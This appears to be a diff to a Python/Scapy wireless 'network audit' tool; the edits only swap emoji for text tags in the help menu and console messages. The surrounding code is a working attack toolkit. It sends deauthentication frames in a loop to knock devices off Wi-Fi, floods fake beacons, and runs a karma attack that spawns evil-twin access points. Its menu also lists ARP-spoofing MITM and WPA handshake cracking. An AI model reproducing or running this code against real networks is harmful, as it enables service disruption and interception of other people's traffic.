@@ -105,7 +105,7 @@ BANNER = r"""
   ██████   ██   ████ ██ ██      ██    
 [/]
 [dim bright_blue]  ──────────────────────────────────────────[/]
-[bold white]  📡 All-in-One Network Audit Pro[/]
+[bold white]  SYSTEM: All-in-One Network Audit Pro[/]
 [dim]  Passive Analysis | WiFi Tactics | ARP Audit[/]
 [dim bright_blue]  ──────────────────────────────────────────[/]
 """
@@ -124,19 +124,19 @@ def show_help():
         ("monitor stop <iface>", "Disable monitor mode"),
         ("", ""),
         ("scan <iface> [duration]", "Scan for APs & Clients"),
-        ("wps <iface> [ch]", "🔓 Find vulnerable WPS networks"),
+        ("wps <iface> [ch]", "[WPS] Find vulnerable networks"),
         ("", ""),
-        ("sniff <iface>", "📡 Live Traffic Audit (OS/Apps)"),
-        ("arp scan [range]", "🌐 Advanced Network Mapping"),
-        ("arp spoof <target> <gw>", "☢ MITM: Intercept local traffic"),
-        ("portscan <ip>", "🔍 Scan open services/ports on a target"),
+        ("sniff <iface>", "[TRAFFIC] Live Traffic Audit (OS/Apps)"),
+        ("arp scan [range]", "[NETWORK] Advanced Mapping"),
+        ("arp spoof <target> <gw>", "[MITM] Intercept local traffic"),
+        ("portscan <ip>", "[SERVICES] Scan open ports on a target"),
         ("", ""),
-        ("deauth <mac> <ap>", "💥 Kick device from network"),
-        ("beacon <name1> <name2>", "🌀 Generate fake WiFi networks"),
-        ("karma", "😈 Karma Attack: Respond to all probes"),
-        ("eviltwin <ssid> <mac> [tgt]", "🎭 Automated Rogue AP attack"),
-        ("crack <pcap> <words>", "🗝 Audit Handshake strength"),
-        ("stop_wifi", "🛑 Stop all active attacks"),
+        ("deauth <mac> <ap>", "[ATTACK] Kick device from network"),
+        ("beacon <name1> <name2>", "[FLOOD] Generate fake WiFi networks"),
+        ("karma", "[KARMA] Respond to all probes"),
+        ("eviltwin <ssid> <mac> [tgt]", "[TARGET] Automated Rogue AP attack"),
+        ("crack <pcap> <words>", "[CRACK] Audit Handshake strength"),
+        ("stop_wifi", "[STOP] End all active attacks"),
         ("", ""),
         ("help / status / clear", "Utility commands"),
         ("exit", "Close application"),
@@ -216,7 +216,7 @@ def wps_audit(iface, duration=15):
                     wps_found[bssid] = pkt[Dot11Elt].info.decode(errors='ignore')
                     break
                 elt = elt.payload.getlayer(Dot11Elt)
-    console.print(f"[bold cyan]🔍 WPS Audit active...[/]")
+    console.print(f"[bold cyan]INFO: WPS Audit active...[/]")
     scapy_sniff(iface=iface, prn=pkt_cb, timeout=duration, store=False)
     # (Display table for wps_found)
 
@@ -248,7 +248,7 @@ def run_sniff(iface, duration=0):
         mac = str(pkt.addr2).upper() if hasattr(pkt, 'addr2') else (pkt.src.upper() if hasattr(pkt, 'src') else "Unknown")
         act = "Traffic"
         tracker.update(mac, "?", act, len(pkt))
-    console.print(f"[bold green]📡 Traffic audit active on {iface}...[/]")
+    console.print(f"[bold green]STATUS: Traffic audit active on {iface}...[/]")
     scapy_sniff(iface=iface, prn=handler, store=False, timeout=duration if duration >0 else None)
 
 # =============================================================================
@@ -264,7 +264,7 @@ COMMON_PORTS = {
 
 def run_port_scan(ip):
     import socket
-    console.print(f"[bold cyan]🔍 Service Discovery on {ip}...[/]")
+    console.print(f"[bold cyan]INFO: Service Discovery on {ip}...[/]")
     results = []
     
     def check_port(p):
@@ -302,7 +302,7 @@ class WiFiTactics:
 
     def deauth(self, target, ap):
         pkt = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
-        console.print(f"[bold red]💥 Deauth Attack: {target} -> {ap}[/]")
+        console.print(f"[bold red]ATTACK: Deauth Attack: {target} -> {ap}[/]")
         while not self.stop_ev.is_set():
             sendp(pkt, iface=self.iface, verbose=False, count=5); time.sleep(0.1)
 
@@ -311,20 +311,20 @@ class WiFiTactics:
         for s in ssids:
             mac = "00:de:ad:be:ef:%02x" % random.randint(0,255)
             pkts.append(RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Beacon()/Dot11Elt(ID='SSID', info=s))
-        console.print(f"[bold magenta]🌀 Beacon Flood: {len(ssids)} SSIDs active[/]")
+        console.print(f"[bold magenta]FLOOD: Beacon Flood: {len(ssids)} SSIDs active[/]")
         while not self.stop_ev.is_set():
             for p in pkts: sendp(p, iface=self.iface, verbose=False); time.sleep(0.01)
 
     def karma_attack(self):
-        """😈 Automatically respond to any SSID being searched for (Probe Requests)."""
-        console.print("[bold red]😈 Karma Attack Active:[/] Responding to all nearby Probe Requests...")
+        """Automatically respond to any SSID being searched for (Probe Requests)."""
+        console.print("[bold red]KARMA: Attack Active:[/] Responding to all nearby Probe Requests...")
         
         def karma_cb(pkt):
             if pkt.haslayer(Dot11Beacon) is False and pkt.haslayer(Dot11Elt) and pkt.type == 0 and pkt.subtype == 4:
                 # Type 0 Subtype 4 = Probe Request
                 ssid = pkt.info.decode(errors='ignore')
                 if ssid and ssid not in self.seen_probes:
-                    console.print(f"[bold yellow]✨ Luring device:[/] Found request for [cyan]{ssid}[/], cloning AP...")
+                    console.print(f"[bold yellow]MATCH: Luring device:[/] Found request for [cyan]{ssid}[/], cloning AP...")
                     self.seen_probes.add(ssid)
                     # Start a background beacon for this specific SSID to attract the device
                     threading.Thread(target=self.evil_twin, args=(ssid, pkt.addr2), daemon=True).start()
@@ -359,7 +359,7 @@ def verify_mic(passphrase, ssid, mac_ap, mac_cl, anonce, snonce, eapol_frame, or
     return mic == original_mic
 
 def audit_hash(pcap, wordlist):
-    console.print(f"[bold cyan]🗝 Real Handshake Audit: {pcap}[/]")
+    console.print(f"[bold cyan]KEY: Real Handshake Audit: {pcap}[/]")
     try:
         pkts = rdpcap(pcap)
         beacon = next((p for p in pkts if p.haslayer(Dot11Beacon)), None)
